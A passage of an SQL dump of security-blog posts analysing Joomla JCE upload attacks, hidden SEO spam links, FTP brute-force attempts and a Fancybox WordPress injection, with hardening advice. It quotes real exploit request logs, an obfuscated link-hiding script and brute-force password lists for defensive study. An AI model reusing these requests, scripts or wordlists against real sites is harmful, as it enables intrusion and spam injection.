'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (46, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (47, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (48, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (49, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (50, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (51, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see 